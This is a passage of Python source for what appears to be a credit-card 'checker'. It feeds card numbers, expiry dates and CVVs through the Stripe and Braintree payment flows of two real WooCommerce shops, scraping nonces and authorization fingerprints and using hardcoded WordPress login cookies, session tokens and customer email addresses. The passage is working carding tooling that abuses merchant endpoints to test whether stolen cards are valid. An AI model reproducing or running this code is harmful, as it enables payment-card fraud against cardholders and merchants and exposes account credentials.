P_waL7rRmIWwiOTqXdgMFe1Qx8Xu8B12w_3HhfE717zOycT2hz0r83hLLeB0bMyfyU-my9YCYDE__CoVbdRUe2m1xou-CnKTUUI77ZE3ejAdS1fpHbdFuAkKv-A8pQrLYTGjA1QHHgHEO5KEbDOp2qvU9zuZ9B6YF9epm3HOLoFH4nutQo5NTjNHdEyUmPR2bN-eBF1U0J5seZn-RMfd791iVjVg40HphWTqm3zvLdf4YT_We7l9U35SU-d9rN1Y31ohhaK_2rXw8KxfQAzoqYBQpjz3hwP0p9Mo6QjW2zq_rGzK_9UhWuv6O3jfPP-t_TNKkqHyjnE-fnD_N7cFXmUCHfKScdkVFGmMUVCSKPeu54w_xzOu4wJLAUs4O-owdlilEC0v2uwh1d6fDyd9zeQ7TaAnwypoCUWX9QN5psCjar37nRsTebCL8IhqPvlzsuGhMQGiIf9zTiEHlDfmfon8_qbDZ0sLzMdeYVA0r0K6rXbIg6I1bCXyjIdB0rsehF-EDKgnEmpCAa5q8K6VD3psQR1Rx9iH5PoThfSLg9H1egxO62w2cHqBIPiYNZ8Qc9k_iDg0jLYRebmXxMPNTGEprSzDkYQBscolveil-aNleHDOZhImIqhzaGFyZF9pZM4DMYNvomtyqDEyNTU0Y2VionBkAA.psC9cT08lKf9denCM3OXm-FQ9Eb6Fy7B1spXT-Fl6yg'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	try:
		id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	cookies = {
	    'mailchimp_landing_site': 'https%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    'sbjs_migrations': '1418474375998%3D1',
	    'sbjs_current_add': 'fd%3D2024-04-07%2004%3A46%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_first_add': 'fd%3D2024-04-07%2004%3A46%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
	    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29',
	    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36',
	    '_gid': 'GA1.2.2024133153.1712465188',
	    '__stripe_mid': 'eb4a06a4-a16f-48d3-b545-a5d2b939a0692c13f4',
	    '__stripe_sid': '8ed4363b-1f40-4dad-b10b-231b86812b80fe8d6b',
	    'mailchimp.cart.current_email': 'visaspam77@gmail.com',
	    'mailchimp_user_email': 'visaspam77%40gmail.com',
	    'wordpress_logged_in_7e0cb64d78df43a3976aa2e14bb58678': 'visaspam77%7C1713674811%7CjKY3AETyBUb2UXfJ7mOzL2McKrepo5PH08IdHzkXSQh%7Ce63d80bb9fa54e5960840b3c640b16a708702ff18b01f88e6ca17d2ae0bf4b21',
	    'tinv_wishlistkey': 'ce8848',
	    'tinvwl_wishlists_data_counter': '0',
	    'sbjs_session': 'pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F',
	    '_ga': 'GA1.1.1576247989.1712465188',
	    '_ga_5YKVZS740T': 'GS1.1.1712465187.1.1.1712465219.28.0.0',
	}
	
	headers = {
	    'authority': 'kaffakoffee.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': 'mailchimp_landing_site=https%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-04-07%2004%3A46%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-04-07%2004%3A46%3A26%7C%7C%7Cep%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F120.0.0.0%20Mobile%20Safari%2F537.36; _gid=GA1.2.2024133153.1712465188; __stripe_mid=eb4a06a4-a16f-48d3-b545-a5d2b939a0692c13f4; __stripe_sid=8ed4363b-1f40-4dad-b10b-231b86812b80fe8d6b; mailchimp.cart.current_email=visaspam77@gmail.com; mailchimp_user_email=visaspam77%40gmail.com; wordpress_logged_in_7e0cb64d78df43a3976aa2e14bb58678=visaspam77%7C1713674811%7CjKY3AETyBUb2UXfJ7mOzL2McKrepo5PH08IdHzkXSQh%7Ce63d80bb9fa54e5960840b3c640b16a708702ff18b01f88e6ca17d2ae0bf4b21; tinv_wishlistkey=ce8848; tinvwl_wishlists_data_counter=0; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fkaffakoffee.com%2Fmy-account-2%2Fadd-payment-method%2F; _ga=GA1.1.1576247989.1712465188; _ga_5YKVZS740T=GS1.1.1712465187.1.1.1712465219.28.0.0',
	    'origin': 'https://kaffakoffee.com',
	    'referer': 'https://kaffakoffee.com/my-account-2/add-payment-method/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
	    'elementor_page_id': '16',
	}
	
	data = {
	    'action': 'create_and_confirm_setup_intent',
	    'wc-stripe-payment-method': id,
	    'wc-stripe-payment-type': 'card',
	    '_ajax_nonce': '9690532329',
	}
	
	response = requests.post('https://kaffakoffee.com/', params=params, cookies=cookies, headers=headers, data=data)
	try:
		return(response.json()['data']['status'])
	except:
		return(response.json()['data']['error']['message'])
def b3(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	
	lines='''visaspam77%7C1714658965%7C0EshPKIp6JthcjzKiNMYZ7dwXiMAlRNzazS5D7FtlKD%7C754b467907a344a370129a2d4635e5240141d058be6e1524231892805bdad753
xelize%7C1714659196%7CGK2uQtKawDYRsGHylTYY7lS6lg8sF8QkiKpT2kMV8Le%7Cd2df2a557616951b2ed93ff75526aa932868061ecbe873f23ed5643a5d5b3295'''

	def up(big):
		cookies = {
			    '_fbp': 'fb.1.1711648537148.73753659',
			    'cookieyes-consent': 'consentid:WjluR202Q0Y4TmFnRmxUSnNnTjNMMWE5RldvdzJsZlc,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
			    'PHPSESSID': '1bc90d593792dc5e3df6c1cfdd12dae2',
			    '_route_pa_sid': '3e644a02-8032-4f81-b5da-5e0188171760',
			    '_route_pa_session_start': '1711648573856',
			    'MCPopupClosed': 'yes',
			    'apbct_site_referer': 'UNKNOWN',
			    '_route_grafana_faro_session_id': 'qScrZP17Te',
			    '_route_pa_application_started_on': '1712018234776',
			    'mailchimp_landing_site': 'https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F',
			    'apbct_site_landing_ts': '1712038997',
			    'wordpress_test_cookie': 'WP%20Cookie%20check',
			    'ct_timezone': '2',
			    'ct_screen_info': '%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A2664%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D',
			    'apbct_headless': 'false',
			    'ct_checked_emails': '0',
			    'ct_checkjs': 'c25d8d0fa3d6f334b683354fe8337391bd18824488da9890f5886161fb9d6100',
			    'ct_has_scrolled': 'true',
			    'ct_mouse_moved': 'true',
			    'ct_has_input_focused': 'true',
			    'ct_has_key_up': 'true',
			    'mailchimp.cart.current_email': 'bs01t.k@gmail.com',
			    'mailchimp_user_previous_email': 'bs01t.k%40gmail.com',
			    'mailchimp_user_email': 'bs01t.k%40gmail.com',
			    'ct_ps_timestamp': '1712039508',
			    'ct_fkp_timestamp': '1712039552',
			    'mailchimp.cart.previous_email': 'bs01t.k@gmail.com',
			    'ct_pointer_data': '%5B%5B280%2C211%2C48995%5D%2C%5B263%2C203%2C54496%5D%2C%5B459%2C179%2C57863%5D%5D',
			    'wordpress_logged_in_08ae37f93a1779f215d75dbe49d77453': big,
			    'apbct_prev_referer': 'https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F',
			    'wfwaf-authcookie-bc9ec945fb53ca8180a8f1faf880822c': '18157%7Cother%7Cread%7C70311d428fda3cb0c0ca6de6bfb744187bc42b3b3083fbfbc5d1aa01c04d28e6',
			    'woocommerce_items_in_cart': '1',
			    'woocommerce_cart_hash': '5b028c45f34dabc52bd1bfbcda803584',
			    'wp_woocommerce_session_08ae37f93a1779f215d75dbe49d77453': '18157%7C%7C1712212363%7C%7C1712208763%7C%7C688c6a08f2548f29a11e06627e066261',
			    'apbct_timestamp': '1712040126',
			    'apbct_page_hits': '30',
			    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252226a9381ca9d194fe91d57f76f1ee456c%2522%257D',
			    'apbct_urls': '%7B%22theruckshop.com%2Fmy-account%2Fcustomer-logout%2F%3F_wpnonce%3D987b12b485%22%3A%5B1712039500%5D%2C%22theruckshop.com%2Fmy-account%2F%22%3A%5B1712039502%2C1712039563%5D%2C%22theruckshop.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1712040123%5D%2C%22theruckshop.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framework%2Fwoocommer%22%3A%5B1712040126%5D%7D',
			    'TawkConnectionTime': '0',
			    'twk_uuid_5c349806361b3372892efe66': '%7B%22uuid%22%3A%221.WrvO8S5PXgl2cr4DVlG5Sj2otMqXCG7cwqvcufG59y4z4yQmsCTQ258RfEzh8NI1l4ZvYcDnpe6F3p8MXafkpTfHf6FroZ7JXGPdGATM7CgDTodzcTD772xPQ%22%2C%22version%22%3A3%2C%22domain%22%3A%22theruckshop.com%22%2C%22ts%22%3A1712040131243%7D',
			}
			
		headers = {
			    'authority': 'theruckshop.com',
			    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
			    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
			    # 'cookie': '_fbp=fb.1.1711648537148.73753659; cookieyes-consent=consentid:WjluR202Q0Y4TmFnRmxUSnNnTjNMMWE5RldvdzJsZlc,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; PHPSESSID=1bc90d593792dc5e3df6c1cfdd12dae2; _route_pa_sid=3e644a02-8032-4f81-b5da-5e0188171760; _route_pa_session_start=1711648573856; MCPopupClosed=yes; apbct_site_referer=UNKNOWN; _route_grafana_faro_session_id=qScrZP17Te; _route_pa_application_started_on=1712018234776; mailchimp_landing_site=https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F; apbct_site_landing_ts=1712038997; wordpress_test_cookie=WP%20Cookie%20check; ct_timezone=2; ct_screen_info=%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A2664%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D; apbct_headless=false; ct_checked_emails=0; ct_checkjs=c25d8d0fa3d6f334b683354fe8337391bd18824488da9890f5886161fb9d6100; ct_has_scrolled=true; ct_mouse_moved=true; ct_has_input_focused=true; ct_has_key_up=true; mailchimp.cart.current_email=bs01t.k@gmail.com; mailchimp_user_previous_email=bs01t.k%40gmail.com; mailchimp_user_email=bs01t.k%40gmail.com; ct_ps_timestamp=1712039508; ct_fkp_timestamp=1712039552; mailchimp.cart.previous_email=bs01t.k@gmail.com; ct_pointer_data=%5B%5B280%2C211%2C48995%5D%2C%5B263%2C203%2C54496%5D%2C%5B459%2C179%2C57863%5D%5D; wordpress_logged_in_08ae37f93a1779f215d75dbe49d77453=bs01t.k%7C1712212362%7CShUrfFFJg3EOSNG2DrkTGIeK3Sw05aWXuzc11s77cUB%7C293e06a8e821c6b04b650f3877965505906d5607b2806d2474e78bd59dd7da3e; apbct_prev_referer=https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F; wfwaf-authcookie-bc9ec945fb53ca8180a8f1faf880822c=18157%7Cother%7Cread%7C70311d428fda3cb0c0ca6de6bfb744187bc42b3b3083fbfbc5d1aa01c04d28e6; woocommerce_items_in_cart=1; woocommerce_cart_hash=5b028c45f34dabc52bd1bfbcda803584; wp_woocommerce_session_08ae37f93a1779f215d75dbe49d77453=18157%7C%7C1712212363%7C%7C1712208763%7C%7C688c6a08f2548f29a11e06627e066261; apbct_timestamp=1712040126; apbct_page_hits=30; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%252226a9381ca9d194fe91d57f76f1ee456c%2522%257D; apbct_urls=%7B%22theruckshop.com%2Fmy-account%2Fcustomer-logout%2F%3F_wpnonce%3D987b12b485%22%3A%5B1712039500%5D%2C%22theruckshop.com%2Fmy-account%2F%22%3A%5B1712039502%2C1712039563%5D%2C%22theruckshop.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1712040123%5D%2C%22theruckshop.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framework%2Fwoocommer%22%3A%5B1712040126%5D%7D; TawkConnectionTime=0; twk_uuid_5c349806361b3372892efe66=%7B%22uuid%22%3A%221.WrvO8S5PXgl2cr4DVlG5Sj2otMqXCG7cwqvcufG59y4z4yQmsCTQ258RfEzh8NI1l4ZvYcDnpe6F3p8MXafkpTfHf6FroZ7JXGPdGATM7CgDTodzcTD772xPQ%22%2C%22version%22%3A3%2C%22domain%22%3A%22theruckshop.com%22%2C%22ts%22%3A1712040131243%7D',
			    'referer': 'https://theruckshop.com/my-account/payment-methods/',
			    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
			    'sec-ch-ua-mobile': '?1',
			    'sec-ch-ua-platform': '"Android"',
			    'sec-fetch-dest': 'document',
			    'sec-fetch-mode': 'navigate',
			    'sec-fetch-site': 'same-origin',
			    'sec-fetch-user': '?1',
			    'upgrade-insecure-requests': '1',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		}
		
		response = requests.get('https://theruckshop.com/my-account/add-payment-method/', cookies=cookies, headers=headers)
		nonce=re.findall(r'"client_token_nonce":"(.*?)"',response.text)[0]
		message=(response.text)
		add = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text).group(1)
		cookies = {
		    'wordpress_sec_08ae37f93a1779f215d75dbe49d77453': 'bs01t.k%7C1712212362%7CShUrfFFJg3EOSNG2DrkTGIeK3Sw05aWXuzc11s77cUB%7C293e06a8e821c6b04b650f3877965505906d5607b2806d2474e78bd59dd7da3e',
		    '_fbp': 'fb.1.1711648537148.73753659',
		    'cookieyes-consent': 'consentid:WjluR202Q0Y4TmFnRmxUSnNnTjNMMWE5RldvdzJsZlc,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes',
		    'PHPSESSID': '1bc90d593792dc5e3df6c1cfdd12dae2',
		    '_route_pa_sid': '3e644a02-8032-4f81-b5da-5e0188171760',
		    '_route_pa_session_start': '1711648573856',
		    'MCPopupClosed': 'yes',
		    'apbct_site_referer': 'UNKNOWN',
		    '_route_grafana_faro_session_id': 'qScrZP17Te',
		    '_route_pa_application_started_on': '1712018234776',
		    'mailchimp_landing_site': 'https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F',
		    'apbct_site_landing_ts': '1712038997',
		    'wordpress_test_cookie': 'WP%20Cookie%20check',
		    'ct_ps_timestamp': '1712039075',
		    'ct_timezone': '2',
		    'ct_screen_info': '%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A2664%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D',
		    'apbct_headless': 'false',
		    'ct_checked_emails': '0',
		    'ct_checkjs': 'c25d8d0fa3d6f334b683354fe8337391bd18824488da9890f5886161fb9d6100',
		    'ct_has_scrolled': 'true',
		    'ct_mouse_moved': 'true',
		    'ct_fkp_timestamp': '1712039082',
		    'ct_has_input_focused': 'true',
		    'ct_pointer_data': '%5B%5B176%2C199%2C8063%5D%5D',
		    'ct_has_key_up': 'true',
		    'mailchimp.cart.current_email': 'bs01t.k@gmail.com',
		    'mailchimp_user_previous_email': 'bs01t.k%40gmail.com',
		    'mailchimp_user_email': 'bs01t.k%40gmail.com',
		    'wordpress_logged_in_08ae37f93a1779f215d75dbe49d77453': big,
		    'wfwaf-authcookie-bc9ec945fb53ca8180a8f1faf880822c': '18157%7Cother%7Cread%7C70311d428fda3cb0c0ca6de6bfb744187bc42b3b3083fbfbc5d1aa01c04d28e6',
		    'woocommerce_items_in_cart': '1',
		    'woocommerce_cart_hash': '5b028c45f34dabc52bd1bfbcda803584',
		    'wp_woocommerce_session_08ae37f93a1779f215d75dbe49d77453': '18157%7C%7C1712211887%7C%7C1712208287%7C%7Cc9a0f1cc898fc3d8e792cec6cffdc26d',
		    'apbct_prev_referer': 'https%3A%2F%2Ftheruckshop.com%2Fmy-account%2Fpayment-methods%2F',
		    'TawkConnectionTime': '0',
		    'twk_uuid_5c349806361b3372892efe66': '%7B%22uuid%22%3A%221.WrvO8S5PXgl2cr4DVlG5Sj2otMqXCG7cwqvcufG59y4z4yQmsCTQ258RfEzh8NI1l4ZvYcDnpe6F3p8MXafkpTfHf6FroZ7JXGPdGATM7CgDTodzcTD772xPQ%22%2C%22version%22%3A3%2C%22domain%22%3A%22theruckshop.com%22%2C%22ts%22%3A1712039179236%7D',
		    'apbct_timestamp': '1712039196',
		    'apbct_page_hits': '24',
		    'apbct_cookies_test': '%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_prev_referer%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522fa032fbd323ff4d43208e3d8b63fb94f%2522%257D',
		    'apbct_urls': '%7B%22theruckshop.com%2Fmy-account%2Fcustomer-logout%2F%3F_wpnonce%3D4cfd1cc4e2%22%3A%5B1712039072%5D%2C%22theruckshop.com%2Fmy-account%2F%22%3A%5B1712039073%2C1712039087%5D%2C%22theruckshop.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1712039094%2C1712039169%5D%2C%22theruckshop.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framework%2Fwoocommer%22%3A%5B1712039103%2C1712039136%2C1712039154%2C1712039171%2C1712039175%5D%2C%22theruckshop.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1712039098%2C1712039133%2C1712039152%2C1712039172%2C1712039196%5D%7D',
		}
		
		headers = {
		    'authority': 'theruckshop.com',
		    'accept': '*/*',
		    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
		    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
		    # 'cookie': 'wordpress_sec_08ae37f93a1779f215d75dbe49d77453=bs01t.k%7C1712211886%7CtYO5JtSP3m3OgR7SAg5G29xip90KjWW6wyogAtRqKmq%7Cf573736bbf3bde3a12563241eebbc26d653e316c4295257d36e093f8aab46dca; _fbp=fb.1.1711648537148.73753659; cookieyes-consent=consentid:WjluR202Q0Y4TmFnRmxUSnNnTjNMMWE5RldvdzJsZlc,consent:yes,action:yes,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes; PHPSESSID=1bc90d593792dc5e3df6c1cfdd12dae2; _route_pa_sid=3e644a02-8032-4f81-b5da-5e0188171760; _route_pa_session_start=1711648573856; MCPopupClosed=yes; apbct_site_referer=UNKNOWN; _route_grafana_faro_session_id=qScrZP17Te; _route_pa_application_started_on=1712018234776; mailchimp_landing_site=https%3A%2F%2Ftheruckshop.com%2Fmy-account%2F; apbct_site_landing_ts=1712038997; wordpress_test_cookie=WP%20Cookie%20check; ct_ps_timestamp=1712039075; ct_timezone=2; ct_screen_info=%7B%22fullWidth%22%3A327%2C%22fullHeight%22%3A2664%2C%22visibleWidth%22%3A327%2C%22visibleHeight%22%3A639%7D; apbct_headless=false; ct_checked_emails=0; ct_checkjs=c25d8d0fa3d6f334b683354fe8337391bd18824488da9890f5886161fb9d6100; ct_has_scrolled=true; ct_mouse_moved=true; ct_fkp_timestamp=1712039082; ct_has_input_focused=true; ct_pointer_data=%5B%5B176%2C199%2C8063%5D%5D; ct_has_key_up=true; mailchimp.cart.current_email=bs01t.k@gmail.com; mailchimp_user_previous_email=bs01t.k%40gmail.com; mailchimp_user_email=bs01t.k%40gmail.com; wordpress_logged_in_08ae37f93a1779f215d75dbe49d77453=bs01t.k%7C1712211886%7CtYO5JtSP3m3OgR7SAg5G29xip90KjWW6wyogAtRqKmq%7C4c901f12cfebd27b00ba7b148ae4423fef479457139456a0375c28af9923e6fb; wfwaf-authcookie-bc9ec945fb53ca8180a8f1faf880822c=18157%7Cother%7Cread%7C70311d428fda3cb0c0ca6de6bfb744187bc42b3b3083fbfbc5d1aa01c04d28e6; woocommerce_items_in_cart=1; woocommerce_cart_hash=5b028c45f34dabc52bd1bfbcda803584; wp_woocommerce_session_08ae37f93a1779f215d75dbe49d77453=18157%7C%7C1712211887%7C%7C1712208287%7C%7Cc9a0f1cc898fc3d8e792cec6cffdc26d; apbct_prev_referer=https%3A%2F%2Ftheruckshop.com%2Fmy-account%2Fpayment-methods%2F; TawkConnectionTime=0; twk_uuid_5c349806361b3372892efe66=%7B%22uuid%22%3A%221.WrvO8S5PXgl2cr4DVlG5Sj2otMqXCG7cwqvcufG59y4z4yQmsCTQ258RfEzh8NI1l4ZvYcDnpe6F3p8MXafkpTfHf6FroZ7JXGPdGATM7CgDTodzcTD772xPQ%22%2C%22version%22%3A3%2C%22domain%22%3A%22theruckshop.com%22%2C%22ts%22%3A1712039179236%7D; apbct_timestamp=1712039196; apbct_page_hits=24; apbct_cookies_test=%257B%2522cookies_names%2522%253A%255B%2522apbct_timestamp%2522%252C%2522apbct_site_landing_ts%2522%252C%2522apbct_prev_referer%2522%252C%2522apbct_page_hits%2522%255D%252C%2522check_value%2522%253A%2522fa032fbd323ff4d43208e3d8b63fb94f%2522%257D; apbct_urls=%7B%22theruckshop.com%2Fmy-account%2Fcustomer-logout%2F%3F_wpnonce%3D4cfd1cc4e2%22%3A%5B1712039072%5D%2C%22theruckshop.com%2Fmy-account%2F%22%3A%5B1712039073%2C1712039087%5D%2C%22theruckshop.com%2Fmy-account%2Fpayment-methods%2F%22%3A%5B1712039094%2C1712039169%5D%2C%22theruckshop.com%2Fwp-content%2Fplugins%2Fwoocommerce-gateway-paypal-powered-by-braintree%2Fvendor%2Fskyverge%2Fwc-plugin-framework%2Fwoocommer%22%3A%5B1712039103%2C1712039136%2C1712039154%2C1712039171%2C1712039175%5D%2C%22theruckshop.com%2Fmy-account%2Fadd-payment-method%2F%22%3A%5B1712039098%2C1712039133%2C1712039152%2C1712039172%2C1712039196%5D%7D',
		    'origin': 'https://theruckshop.com',
		    'referer': 'https://theruckshop.com/my-account/add-payment-method/',
		    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
		    'sec-ch-ua-mobile': '?1',
		    'sec-ch-ua-platform': '"Android"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-origin',
		    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
		    'x-requested-with': 'XMLHttpRequest',
		}
		
		data = {
		    'action': 'wc_braintree_credit_card_get_client_token',
		    'nonce': nonce,
		}
		
		response = requests.post('https://theruckshop.com/wp-admin/admin-ajax.php', cookies=cookies, headers=headers, data=data)
		no=response.json()['data']
		encoded_text = no
		decoded_text = base64.b64decode(encoded_text).decode('utf-8')
		au=re.findall(r'"authorizationFingerprint":"(.*?)"',decoded_text)[0]
		with open('gates.json', 'r') as json_file:
			existing_data = json.load(json_file)
# Ø¥Ø¶Ø§ÙØ© ÙØ¹ÙÙÙØ§Øª Ø¬Ø¯ÙØ¯Ø© Ø¥ÙÙ Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙØ­Ø§ÙÙØ©
			new_data = {
				big : {
	  "nonce": nonce,
	  "au": au,
	  "add": add
				}
			}
	
			existing_data.update(new_data)
	
	# ÙØªØ§Ø¨Ø© Ø§ÙØ¨ÙØ§ÙØ§Øª Ø§ÙÙØ­Ø¯Ø«Ø© Ø¥ÙÙ Ø§ÙÙÙÙ
			with open('gates.json', 'w') as json_file:
				json.dump(existing_data, json_file, ensure_ascii=False, indent=4)
	with open('filei.txt', 'r') as file:
		first_line = file.readline()
	lines = lines.strip().split('\n')
	while True:
		random_line_number = random.randint(0, len(lines) - 1)
		big = lines[random_line_number]
		if big == first_line:
			pass
		else:
			with open('gates.json', 'r') as file:
				json_data = json.load(file)
			try:
				add=json_data[big]['add']
				nonce=json_data[big]['nonce']
				au=json_data[big]['au']
				break
			except Exception as e:
				print(e)
				for big in lines:
					try:
						up(big)
					except Exception as e:
						print(e)
	print(big)
	with open('filei.txt', 'w') as file:
		file.write(big)
	headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-EG;q=0.8,ar-AE;q=0.7,ar;q=0.6',
	    'authorization': f'Bearer {au}',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': '9a74f190-c314-4e07-8de8-d6bab90e19b6',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	try:
		tok = response.json()['data']['tokenizeCreditCard']['token']
	except:
		for big in lines:
			try:
				up(big)
			except Exception as e:
				print(e)
	cookies = {	    'wordpress_logged_in_08ae37f93a1779f215d75dbe49d77453': big,
	}
